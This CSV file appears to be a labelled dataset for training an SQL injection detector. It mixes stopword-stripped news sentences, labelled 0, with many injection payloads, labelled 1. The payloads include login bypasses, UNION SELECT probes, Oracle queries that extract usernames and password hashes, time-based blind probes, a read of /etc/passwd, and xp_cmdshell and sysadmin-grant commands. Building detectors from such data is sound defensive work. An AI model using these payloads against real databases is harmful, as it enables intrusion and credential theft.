Sentence,Label
"He realised , early , computers divinities",0
"British police serve Assange extradition notice Btitish police served extradition notice today WikiLeaks founder Julian Assange , taken refuge Ecuador &apos;s embassy London requested asylum",0
'||'6,1
"A statement OPCW , works closely United Nations , said team &quot; satisfied verified - seen destroyed - Syria &apos;s declared critical production mixing / filling equipment",0
"&quot; And slice disappear inside Jumbo , &quot; said , announcing sampling product",0
"7 inches , according U",0
"4 cents per gallon , &apos;t gone 20 years",0
"Rather , said , friendships Lord clouded judgements reporting",0
"select * from users where id = 1 or ""?;"" or 1 = 1 -- 1",1
"select * from users where id = 1 or ""_;"" or 1 = 1 -- 1",1
"select * from users where id = 1 or 1#"", = 1 or 1 = 1 -- 1",1
"select * from users where id = 1 or "" ) ,"" or 1 = 1 -- 1",1
"The eye placed one ray fall, might testify particular ray",0
Königsfeld: Small team gives spirited performance The voluntary fire service bravely came main autumn test run spite lack personnel,0
pdf 201704/00001491530747318,0
x' AND userid IS NULL; --,1
"As case previous year , Felix Bader managed hold small lead right end defended title overall winner short distance race Once , Pascal Treubel took second place",0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND 'i' = 'i",1
or username like char ( 37 ) ;,1
Bombardier said evaluating entry-into-service (EIS) schedule provide update next months,0
"In addition , train journey Titisee-Neustadt Freiburg , experienced first-hand efforts already undertaken develop public transport",0
"select * from users where id = 1.<@$ union select 1,version (  )  -- 1",1
"select * from users where id = 1 or 1#"" (  union select 'a',version (  )  -- 1",1
"A foolish consistency hobgoblin little minds, adored little statesmen philosophers divines",0
The Aachen resident suffered serious injuries taken hospital treatment,0
"Forty percent Roman Catholics South America , tiny number cardinals",0
"Marinuskirche Dunningen Sunday 27 October , 10",0
"In projections , supervisory council energy company even assumed levy higher reported Jörg-Arne Bias",0
x' or full_name like '%bob%,1
"Highland Games Kaltenhof Alongside brake van pulling tractors , also second contest agricultural autumn festival Kaltenhof 6 8 September",0
"An exasperated Sebelius uttered phrase , caught hot mic , aide seated behind yesterday &apos;s House hearing following contentious exchange Rep",0
' or 1 = 1 or '' = ',1
"select * from users where id = 1 union select 1`\`,version (  )  -- 1",1
"In Oregon , planners experimenting giving drivers different choices",0
"select * from users where id = 1 or "" ) ["" or 1 = 1 -- 1",1
Analysts expected earnings 10 cents per share revenue $ 4,0
"A young team visionaries headed White House , nation ready change",0
"Fenton animal mad - loves horses , tractors farms got two chickens looks",0
"&quot; Our home best example property simply &apos;t work old age , &quot; begins recount",0
lawmakers head Europe help address concerns abroad alleged U,0
"The masses water caused considerable damage Gechingen 2009 equivalent 1,000-year flood",0
bfilename,1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
1 or pg_sleep ( __TIME__ ) --,1
"select * from users where id = '1' <@._ union select 1,version (  )  -- 1'",1
"On website Ditta gave question answer session says fantasy job would lawyer representing clients Death Row America , ultimate dinner guest Mohammed Ali inequality motivation work",0
"When boy around 15 , transitioned back boy married woman",0
"&quot; While weaker aircraft deliveries mostly anticipated , clearly disappointed margin performance transportation , &quot; Doerksen said client note",0
"Ruins measuring five metres tall , made stones around size palm hand , waiting discovered",0
"select * from users where id = 1 or 1#"" (  union select version (  ) ,version (  )  -- 1",1
"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1
select * from users where id = '1' or \<$ or 1 = 1 -- 1',1
"They &quot; provided us many question marks , seem lost exclamation marks &quot;",0
"&quot; It important , keep family life stage mind , , account demographic change , period spent providing long-term care support relatives well , &quot; explained Wolf",0
00 p,0
"select * from users where id = 1 or ""] ) "" or 1 = 1 -- 1",1
"&quot; These investments respond ideas front-line clinicians told best ways tend Tasmania &apos;s health system , &quot; Ms Plibersek said",0
Mr Ditta betrayed trust attempted hide behind veneer profession,0
"A cost calculation performed team professionals , submitted Town Council , make decision determine ongoing procedure",0
"But keep head shoulder? Why drag corpse memory, lest contradict somewhat stated public place? Suppose contradict yourself; then? It seems rule wisdom never rely memory alone, scarcely even acts pure memory, bring past judgment thousand-eyed present, live ever new day",0
Their every truth quite true,0
Roark et al,0
To read Philip K,0
"Deep cracks number individual stones testify weather damage , however , present wall danger collapse",0
She minutes city centre using public transport,0
Geisingen Kirchen-Hausen first documented together year 794,0
"&quot; It added , &quot; inspection activities currently planned",0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
We &apos;ve really enjoyed developing Defender Challenge car - &apos;ll really fun championship,0
3.10E+17,1
"Only goalkeeper , Roman Weidenfeller , first BVB player step onto field , cheers briefly erupt , usually case",0
"Panic broke among waiting , many hiding behind seats fear",0
Here &apos;s point: sometime soon growing anti-EU anti-common currency feeling Europe coalesce kill euro,0
"exec sp_addsrvrolemember 'name' , 'sysadmin'",1
"And sometimes also want peace quiet , &apos; believes",0
"At 19: 00 , &quot; biraböhmische &quot; (a play words alluding regions pear trees , Bohemia , perhaps love beer well !) wind music group Schömberg , provide great evening entertainment",0
The Los Angeles LAX airport one largest airports USA,0
0x770061006900740066006F0072002000640065006C00 ...,1
"On Thursday , data showed continued export weakness , softening consumer demand",0
"The airline fee Hungary &apos;s Wizz Air , said airline consultant Jay Sorensen , closely tracks add-on fees",0
"select * from users where id = '1' union select $*$,@@VERSION -- 1'",1
automaker since 2009 bankruptcy restructuring,0
California planners looking system devise strategies meet goals laid state &apos;s ambitious global warming laws,0
Pamela Anderson latest celebrity shock fans dramatic new hairdo,0
Orlando Bloom Miranda Kerr still love Actors Orlando Bloom Model Miranda Kerr want go separate ways,0
"When GDF-Suez plant added network , around 5 million tonnes coal imports per year realistic",0
t'exec master..xp_cmdshell 'nslookup www.googl ...,1
"&quot; A landmark event taken place today: Construction started Bulgarian section South Stream gas pipeline , large-scale important project Europe , &quot; Gazprom Chairman Alexei Miller said statement Thursday",0
"Frontier loyal base customers home city Denver , business shrinking losing money",0
"For reason , traditional email like open postcard sealed letter",0
That troubles,0
"This trader , Richard Usher , left RBS 2010 understand given leave current position European head forex spot trading JPMorgan",0
"admin"" or ""1"" = ""1""#",1
"select * from users where id = 1 or \+<$ union select 1,@@VERSION -- 1",1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( column_name  )  )   FROM sys.all_tab_columns  )  )   AND 'i' = 'i,1
The tennis division Sportfreunde Rohrdorf (Rohrdorf Sports Fans) enjoyed perfect weather tournament local clubs enthusiasts,0
hi or a = a,1
' or 1 = 1 /*,1
&quot; Intersex children pose ethical dilemma,0
"Bashful bold, then, know make us seniors unnecessary",0
A study aiming increase benefits Scotland HS2 rail project announced UK government,0
"According police , 63-year-old man suddenly stepped pub onto footpath , cyclist unable brake time",0
Theology courses offer broad training,0
select * from users where id = 1.*1 or 1 = 1 -- 1,1
"select * from users where id = '1' union select @ 1,version (  )  --  1'",1
Climate change taken account form allowance 15 per cent,0
"select * from users where id = '1' union select 1a,banner from v$version where rownum = 1 -- 1'",1
000 1,0
Representatives Federal Prosecutor could either submit questions writing meet 30-year-old person Russia,0
"In fact , Americans spend $ 330 million pet costumes year , according NRF",0
"Not yet school months taking first steps , toddler pet Shetland pony Toffee trotted three rounds ease take top prize - leaving 30 adult opponents trailing behind",0
The Guangzhou-based New Express made rare public plea release journalist Chen Yongzhou,0
"In various projects , learned different tasks involved Christian church life attended Youth Day Untermachtal together",0
"When fire service arrived , flames already bursting window",0
He could released within 15 years granted parole,0
"Schools urged focus maths , spelling grammar English literature courses require pupils study least one Shakespeare play , 19th century novel , Romantic poetry contemporary British fiction 1914 onwards",0
"They best names , like &quot; Terror Behind Walls &quot; (which , way actual prison), &quot; Howl-O-Scream &quot; &quot; The House Shock",0
", &quot; Oldies &quot; bring celebrations close",0
"Ditta denied wrongdoing claimed: &quot; If I corrupt lawyer , I , I wanted feed information Mr Scarborough , I would wait 15 hours , I would immediately",0
"We found vast majority businesses looking export outside Europe , focusing countries modernising growing EU states stagnate",0
The way started &apos;ll Horse Year show long - I &apos;m sure &apos;ll well,0
--sp_password,1
select * from users where id = 1 +  ( \+ )  or 1 = 1 -- 1,1
update,1
They never believed died way sheriff concluded,0
"&quot; Mr Edis said Coulson &apos;s involvement story followed pattern important men , former home secretary David Blunkett",0
5 metres accommodate oncoming traffic,0
"The tunnel , zigzags length nearly six football pitches , links warehouses near Tijuana , Mexico San Diego , USA",0
In old age everyone quirks ticks,0
"In methods, punctuation prediction treated separated post-procedure parsing, may suffer problem error propagation",0
"Together accomplice , procured women , brought various brothels south-west",0
And I close book,0
"This year , Americans spend around $ 106 million pumpkins , according U",0
It &apos;s apparent continuation Israel &apos;s campaign keep arms proliferating Mideast,0
â or 3 = 3 --,1
"' union  ( select NULL, NULL, NULL, NULL,  NULL,  ( select @@version  )  )   --",1
"There residents home fire , continued police spokesperson",0
having 1 = 1--,1
hi' )  or  ( 'a' = 'a,1
Definitely nothing like student accommodation shared bathroom kitchen,0
"select * from users where id = 1 union select +!<@,version (  )  -- 1",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
"select * from users where id = 1 or "",,"" = 1 or 1 = 1 -- 1",1
"Areane Blersch Binzwangen took second place , ahead Natascha Werner Stuttgart",0
"Jack Drescher , specializes issues gender identification , said new German law &quot; sounds like good thing",0
"select * from users where id = 1 or "",."" or 1 = 1 -- 1",1
"According statement , man hid woman forest near Helmstedt",0
Adjusted earnings per share unchanged 9 cents,0
"&quot; They absolutely think son murdered , &quot; Benjamin Crump , attorney representing Kenneth Jacquelyn Johnson , told FoxNews",0
"select * from users where id = 1 or ""{{"" or 1 = 1 -- 1",1
But transmissions stronger devices downloading sending data,0
His state recently put tracking devices 500 cars test pay-by-mile system,0
"Other findings support conclusion , many contributing factors",0
||'6,1
"US President Barack Obama kept informed situation , said White House spokesperson Jay Carney",0
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( PASSWORD  )  )   FROM SYS.USER$  )  )   AND 'i' = 'i,1
"On government side , said 29,954 members President Bashar Assad &apos;s armed forces , 18,678 pro-government fighters 187 Lebanese Hezbollah militants",0
"Historically high prices gold past two years added rush pawn personal belongings , people take opportunity cash value family jewellery",0
"As immediate measure , Watzke prohibited Ultras organising choreography home match VfB Stuttgart",0
"Soon drop , Scarborough regular phone contact Ditta dinner Blackburn Rovers football stadium , Ewood Park",0
"Recommendations drug hormone therapy based child &apos;s age , rate development , growth rate emotional maturity",0
"However , concern small medium-sized companies remain vulnerable hacking surveillance",0
"On several occasions , speaker asked listening guess proverb based",0
a' or 'a'  =  'a,1
order by,1
"select * from users where id = 1 or "".;"" or 1 = 1 -- 1",1
"More three hours hearing , Long repeatedly pressed Sebelius &quot; architect &quot; Affordable Care Act voluntarily forgone government-sponsored insurance purchase plan HealthCare",0
"During morning , Migration Integration working group also sought continue discussions",0
/**/or/**/1/**/ = /**/1,1
""" )  or true--",1
password:*/ = 1--,1
"select * from users where id = 1 or 1#"". union select null,version (  )  -- 1",1
"In United States , average age 12",0
"This venue completed inaugurated anniversary year , official date set last weekend September , 27 28 September",0
""" or 1 = 1--",1
"Among others , proposals already ruled include proposals bringing samples back Mars , conducting research moon , Venus asteroids , well proposals area solar physics",0
' UNION ALL SELECT,1
1 billion $ 4,0
'; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
"select * from users where id = 1 +  ( $+ )  union select null,@@VERSION -- 1",1
"Häußler commented flood found Gechingen unprepared 15 May 2009 , decisive event raising question protective measures future",0
"Gazprom &apos;s Alexei Miller says pipeline Bulgaria starts new gas era The start construction South Stream gas pipeline Bulgaria marks launch one Europe &apos;s largest energy projects , Gazprom &apos;s chief said",0
"A witness , whereby one woman suffered blue bruises body , yet make statement",0
I sterilized birth -- one ever told,0
"&quot; I frustrated angry anyone , &quot; said",0
"This includes Australia United Kingdom , typically largest profit generators",0
Two top-class junior cyclists also starting line-up competition: Felix Bader Bad Waldsee Pascal Treubel Aach-Linz came recommendation achieved good positions German Championships,0
The speaker Johanna Rahner,0
The Energy Department said Wednesday U,0
")  or benchmark ( 10000000,MD5 ( 1  )  )  #",1
Users Twitter published photos SWAT officer weapon lying ground,0
"Chris says ice cream lights reacts heat mouth means lick , brighter becomes",0
"select * from users where id = '1' union select \.#,@@VERSION -- 1'",1
Witnesses saw two people sitting car,0
"select * from users where id = '1' or  ( \. )  = 1 union select 1,@@VERSION -- 1'",1
"select * from users where id = 1 or ""_ ) "" or 1 = 1 -- 1",1
"The court also upheld remaining sections 2700 page law , held health care law &apos;s requirement states increase Medicaid eligibility else lose federal Medicaid funding unconstitutionally coercive",0
One conduct transition actions parsing followed punctuation predictions cascaded way,0
I hear preacher announce text topic expediency one institutions church,0
"A secure wall essential school yard used pupils , purpose current fortification work",0
"&quot; You must continue tenacious make sure local public transport becomes even better , &quot; explained address given local politicians attendance",0
"The contract fell 39 cents Thursday , leaving 5",0
"select * from users where id = '1' or \<\ union select 1,@@VERSION -- 1'",1
The film never slips prurience sensationalism - &apos;s problem,0
The band &apos;s announcement came forced similarly postpone gig LG Arena Birmingham Thursday,0
There treatments delay early menses ward another consequence: premature aging bones ultimately lead stunted growth short adult,0
"select * from users where id = 1 or ""%["" or 1 = 1 -- 1",1
"To end , commissioned largest comprehensive poll British business leaders asking thoughts Britain , business EU",0
"Perhaps crazy , perhaps drugs affected brain",0
"&quot; And , recently , cannot excuse failure design simple website three years since Affordable Care Act signed law",0
&quot; Time accurate test puberty going progress,0
"&quot; The 100-year-old natural stone wall , serving foremost boundary old school yard - due renovated - Kirchstrasse , feature renovation cost plan town Bräunlingen",0
cgi 109090 1097 11 11,0
"In documentation leaked Mr Snowden , , however , evidence date US passed foreign companies &apos; trade secrets companies",0
"And started nonprofit , ASCOVIME , travels rural areas weekends provide free medical care",0
They &apos;ve push vehicles rivers mud,0
"The report also gives overview discrimination faced intersex transgender people realm employment , well levels harassment , violence bias crimes",0
"The next morning , team begins meeting hundreds patients",0
"select * from users where id = 1 or  ( \. )  = 1 union select 1,@@VERSION -- 1",1
"select * from users where id = 1 or ""{ ) "" or 1 = 1 -- 1",1
"As always , south stand left end , finally stand resumed usual role loudest section stadium",0
"or 0 = 0 #""",1
Last year team University Lincoln found dogs turn heads left looking aggressive dog right looking happy dog,0
"The 45-year-old found guilty mass murder attack two nightclubs popular tourist area Kuta left 202 people dead , including 88 Australians , injured scores",0
"select * from users where id = '1' union select ""?""_,version (  )  -- 1'",1
"select * from users where id = '1' + $+*$ union select 1,@@VERSION -- 1'",1
Around 50 listeners enjoyed sounds Hammrich musicians,0
"But devices testing appeal highway planners &apos;t use GPS deliver limited amount information , uploaded periodically modem",0
"select * from users where id = '1' union select @ @1,version (  )  --  1'",1
admin'or 1 = 1 or '' = ',1
"Following renovation , plastering planting trees old internal school yard , within two wings 1912 school , subsequent measure boundary wall , need refurbishment , must renovated ground within foreseeable future",0
"I remember answer quite young I prompted make valued adviser, wont importune dear old doctrines church",0
"Saying many myths would &quot; far wild , far scandalous cases far filthy taught schools , &quot; Crossley-Holland advocated &quot; careful selection &quot; age-appropriate works",0
In past Pope decided everything,0
"What pretty oracles nature yields us text, face behaviour children, babes, even brutes! That divided rebel mind, distrust sentiment arithmetic computed strength means opposed purpose, not",0
"As diets change , people get bigger plane seating radically changed",0
'; execute immediate 'sel' || 'ect us' || 'er',1
' or username like '%,1
"However , man found wheel trims nearby prior police arriving , account police involvement required",0
It also recommends schools epinephrine stocked -- EpiPen brand auto-injector commonly used -- respond potentially fatal anaphylaxis,0
"That crippling cost disadvantage , &apos;ve already seen Grangemouth",0
The presenter established one thing right outset: The important thing comes ham legs pork - turbo fattening provide good basis,0
or '' = ',1
' or 1/*,1
"admin"" or 1 = 1--",1
"They neither perform proper segmentation output sentences, predict punctuation symbols",0
"Astronomers already found 1,000 planets near stars",0
"&quot; During period investigated , Ms Pawlby &apos;s grandparents received anonymous calls asking information , Mr Edis said",0
admin' or 1 = 1--,1
"select * from users where id = 1 or "" ( ;"" or 1 = 1 -- 1",1
"select * from users where id = 1 union select @ 1$,version (  )  -- 1",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
"Eventually, two segmentations formed according punctuation prediction results, shown Figure 1(c)",0
""" )  or benchmark ( 10000000,MD5 ( 1  )  )  #",1
%28,1
"Among initiatives , Burfien wants organise study days young people , inviting famous faces studied theology",0
"&quot; Finally ! &apos; , raved Mayor Steinar Bergsland inaugural ceremony , televised broadcaster TV2",0
x' and userid is NULL; --,1
Kerr Bloom married since 2010,0
"&quot; A blatant wrong decision , &quot; commented Rangnick , referred Harkam &quot; completely depth &quot;",0
Some commentators interpreted use force attempt ailing movement win concessions financial spoils government,0
"union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",1
declare @s varchar ( 22 )  select @s  =,1
"The syllabus place greater focus &quot; real world problems , &quot; including financial mathematics",0
"Men called good action, piece courage charity, much would pay fine expiation daily non-appearance parade",0
pdf 201704/00001491529916387,0
"select * from users where id = 1 or 1#""@ union select version (  ) ,version (  )  -- 1",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
;waitfor delay '0:0:__TIME__'--,1
Those drivers soon pay mileage fees instead gas taxes state,0
USA: Shots fired Los Angeles Airport On Friday morning (local time) unknown suspect fired shots LAX Airport,0
hi' or 'x' = 'x';,1
"If street clear , pedestrian obtains green light immediately , , delay around 15 seconds",0
"Now 29 , Katie married University Pennsylvania , resident child psychiatry",0
"Morsi took symbolic oath Friday Tahrir Square , birthplace uprising ended Mubarak &apos;s authoritarian rule last year , vowed reclaim presidential powers stripped office military council took ousted leader",0
"The bank , declined comment suspensions , confirmed month received requests information regulators",0
"select * from users where id = 1 or 1#"", union select 1,version (  )  -- 1",1
\'; desc users; --,1
declare @s varchar  ( 8000 )  select @s  =  0x73656c65637420404076657273696f6e,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( USERNAME  )  )   FROM SYS.ALL_USERS  )  )   AND 'i' = 'i,1
"Within companies , administrators often able read electronic mail sent",0
"select * from users where id = 1 or ""$["" or 1 = 1 -- 1",1
"You almost think see folds old man &apos;s neck , young fisherman Manolo speaks",0
"Women &apos;t sexy professionals anymore; also sexy foods like pizza , hamburgers carrots",0
pdf 201704/00001491531280013,0
"select * from users where id = '1'<@.. union select 1,version (  )  -- 1'",1
"7 billion years ago , cosmos created Big Bang",0
"Renamo wanted &quot; warn international community things going well Mozambique , &quot; Mr Mazanga said",0
"select * from users where id = 1 + \+*$ union select null,@@VERSION -- 1",1
"benchmark ( 10000000,MD5 ( 1  )  )  #",1
"While number Yahoo Mail accounts fallen recently , Google &apos;s Gmail managed grow considerably",0
select * from users where id = 1 or  ( \+ )  = 1 or 1 = 1 -- 1,1
"ISLAMIST Mohamed Morsi promised &quot; new Egypt &quot; took oath office become country &apos;s first freely elected president , succeeding Hosni Mubarak ousted 16 months ago",0
or 1 = 1/*,1
"The Public Prosecutor accused stabbed beaten three men car Finowfurt , together unknown accomplices",0
"Asked would return post prime minister , Mr Blair quoted London &apos;s Evening Standard saying: &quot; Yes , sure , &apos;s likely happen ,",0
"select * from users where id = 1 or ""@ ( "" or 1 = 1 -- 1",1
"&quot; It severe , &quot; assured Watzke",0
A rapid progression may warrant tests endocrinologist rule serious problems tumors cysts,0
", 1: 00 p",0
"' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,116  )  )  <>char ( 39,39  )  )  ,1,0  )  )  ;",1
"Five matches scheduled team , every team playing one match others",0
"&quot; New voices love sing welcome time , &quot; said Schlotmann",0
"&quot; Concerns Big Brother sorts things major problem , &quot; said Alauddin Khan , directs strategic performance management Nevada Department Transportation",0
"In villages , free medical care truly cause celebration , Bwelle -- big smile boundless energy -- happy join fun",0
"select * from users where id = 1 or \<\ union select null,@@VERSION -- 1",1
"It seeking break emerging market auto insurance , drivers would pay based mileage",0
Gallen Monastery,0
' or 0 = 0 --,1
' or ''^',1
"select * from users where id = 1 or $<\ union select 1,@@VERSION -- 1",1
select * from users where id = 1 <@. or 1 = 1 -- 1,1
"&quot; &quot; But move could make foreign investors reticent buy property London current owners reluctant sell , &quot; added",0
", numerous artisans broom maker , sewer , spinner , weaver baker letting visitors look shoulders",0
"The access roads blocked , , according CNN , caused long tailbacks",0
"Now New Express undergo &quot; full rectification , &quot; regulator said",0
"Infancy conforms nobody: conform it, one babe commonly makes four five adults prattle play it",0
"Some valley residents lay back sun loungers , others safely put sunglasses",0
"According Kaiser , many hikers refer area showpiece Schluchtensteig , landscape provides ideal framework fantastic views",0
1 exec sp_  ( or exec xp_ ),1
&quot; It immediately clear facility Safira one two sites OPCW inspectors able visit,0
"select * from users where id = '1' + @<@# union select 1,version (  )  -- 1'",1
"admin"" or 1 = 1/*",1
Suitable clothing desirable - example competitors wear kilts,0
"Therefore , I hope players finally managed clear heads short break",0
"If often evening , often several people car , know back seat look like partied night: clothes , bottles rubbish begin pile",0
$ 325m rescue package Tassie health The Federal Government insists $ 325 million rescue package Tasmania &apos;s ailing health system tough conditions attached ensure State Government &apos;t waste funds,0
UN Secretary-General Ban Ki-moon told summit overnight time &quot; rise national interests,0
or 'a' = 'a,1
"select * from users where id = 1.%@ union select 1,version (  )  -- 1",1
The Hamburg Towers basketball project declining make application possible stand-in place,0
"We museum , two churches , spa gardens , bus stop , doctor &apos;s practice bank , mention traffic &apos; Grub &apos; residential area",0
On Wednesday slashed mileage award 25 percent miles trip,0
"However , press agency Reuters also quoted anonymous Israeli government official saying believed Israel carried attack , sure",0
"The target &quot; missiles related equipment &quot; , Israeli government feared intended Lebanese Hezbollah , according CNN",0
Parents hesitate get guidance pediatrician talk child,0
He firmly defended German compatriot: &quot; In individual situation I would behaved way Roger Schmidt &quot;,0
"select * from users where id = 1 or ""? ( "" or 1 = 1 -- 1",1
Silvia Kimmich-Bantle father Karl Kimmich entertained attendance popular tunes,0
"&quot; I hope president listen us , appeal reject bill return MPs , &quot; said",0
admin' )  or  ( '1' = '1'--,1
New York City looking one,0
"Leaving voicemail June 18 2005 , Coulson told her: &quot; I &apos;ve got story &apos;re planning run tomorrow I really would like speak Charles",0
"On Thursday , six adjudicators assessed numerous rabbits able assign awards exceptional animals",0
Learning rather unemployment: Tourism pilot project untrained A pilot project tourist industry launched today Mecklenburg lake district,0
"government shutdown , investors kept focus probably matters more: Federal Reserve",0
"&quot; We need careful identify true onset puberty , &quot; said Dr",0
"On predominantly empty stage - one important requirement: crumpled sofa , cast members allude copulating masturbating - eight-person ensemble work way text material",0
"Because Germany ally USA , Snowden would risk deportation travel , source continued",0
"Earlier NSA spokesperson told ABC News agency &apos;s internal , sensitive network &quot; &quot; compromised",0
"It without doubt long path , chief nuclear negotiator satisfied negotiation process also optimistic sides come solution end",0
select * from users where id = 1 or \.<1 or 1 = 1 -- 1,1
Clear victories first two sets clearly demonstrated superiority Freudenstadt team areas,0
"Ah, could pass neutrality! Who thus avoid pledges, observed, observe unaffected, unbiased, unbribable, unaffrighted innocence, must always formidable",0
"As men , I expect seeing lot zombies , thanks The Walking Dead I &apos;ll bet Daft Punk space men make Instagram feeds year",0
UNION SELECT,1
State legislatures recently updating rules allow schools stock epinephrine easily,0
"In 2006 set task , &quot; Become one , remain five &quot; came realise task really simple",0
It also allows passengers choose seat advance buy directly Frontier website,0
' having 1 = 1--,1
"I hope somewhat better whim last, cannot spend day explanation",0
"select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1",1
' or 'unusual'  =  'unusual',1
Matusov et al,0
"In addition, approaches able incrementally process inputs efficient long inputs, especially cases long transcribed speech texts presentations number streaming words could larger hundreds thousands",0
Peter Hughes Paddy &apos;s Bar suicide bomber detonated backpack loaded explosives 20 seconds earlier,0
"select * from users where id = 1 or 1#""{ union select 1,version (  )  -- 1",1
admin' #,1
At moment sort bias towards Europe especially towards Italy,0
They accompanied strict security precautions,0
The conclusions poll come surprise many,0
"select * from users where id = 1 or "",#"" or 1 = 1 -- 1",1
"In small town New Zealand , Burt Munro considered lovable oddball , resolved compete race America 1920 motorbike",0
"Coulson used phone hacking verify tip Former News World editor Andy Coulson allegedly used &quot; phone hacking , surveillance confrontation &quot; attempt confirm bogus tip affair involving then-home secretary Charles Clarke",0
2 billion dollars $ 6,0
"Two five people country live poverty line , nearly three-quarters country &apos;s health-care spending private",0
Patek may yet appeal sentence,0
"select * from users where id = 1 or "";."" = 1 or 1 = 1 -- 1",1
"However , Dick &apos;s story yet finished",0
"For US carriers , impact ruling vary airline airline depend age fleet",0
We wish apologise ticket holders inconvenience caused,0
)  )   or sleep ( __TIME__ )  = ',1
You must court him: court you,0
"""  )  )   or   (  (  ""x""  )  )   =   (  (  ""x",1
Nevada already completed pilot,0
"The larger trees cut advance , although forest tractors on-call required",0
"The revelation notable bombshell Mark Halperin John Heilemann &apos;s heavily anticipated 2012 campaign tome , &quot; Double Down: Game Change 2012",0
"select * from users where id = 1 union select !<1,version (  )  -- 1",1
"At post-mortem campaign meeting , told staff needed get back track stay true purpose cause",0
The judges marked Fenton Toffee well turned way presented show ring,0
Airlines show FAA airplanes meet new guidelines &apos;ve updating flight crew training manuals rules stowing devices reflect new guidelines,0
"In past , good financial situation meant local authorities could away high municipal rates",0
"In central blocks south stand , blocks 12 13 , nothing moved",0
admin' )  or  ( '1' = '1'#,1
The prevailing theory treat children ambiguous genitalia put forward Dr,0
"Crossley-Holland , translated Beowulf Anglo-Saxon well writing Penguin Book Norse Myths British Folk Tales , said: &quot; You may well intentions better keep well sight",0
During course day one thing became particularly clear: scepticism towards new system reluctantly yet visibly giving way confidence,0
"select * from users where id = 1 or ""?@"" or 1 = 1 -- 1",1
We testing past months seemed perfect share Halloween gives wonderful glow effect,0
The Electoral Commission studying options electronic voting recently released joint discussion paper New Zealand,0
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 8 )  waitfor delay '0:0:2' --",1
"Created overseen Caroline Hirsch , founder standup institution Carolines , festival celebrates tenth anniversary year , sixty shows small clubs large theatres",0
"&quot; Left , politicians would bankrupt country take us back hunting gathering , &quot; wrote",0
At least twice earlier year Israel launched airstrikes shipments missiles inside Syria,0
"There may also deviations could show physicians path new theory , umbrella known natural laws could united",0
"He manages focus audience &apos;s attention , result monologues never become boring , even moment",0
"admin"" )  or  ( ""1"" = ""1",1
cgi 1081743475 1085 109-1,0
"select * from users where id = 1 or \<\. union select 1,@@VERSION -- 1",1
Is Europe &apos;s elite ready business Britain ? Business Britain launched April pledge bring business together define UK &apos;s wealth job creators want see changed relationship EU,0
""" or """"-""",1
"The 21-year-old raped Anene Booysen February industrial estate Bredasdorp , near Capetown",0
I &apos;t remember discussed definitely &apos;t,0
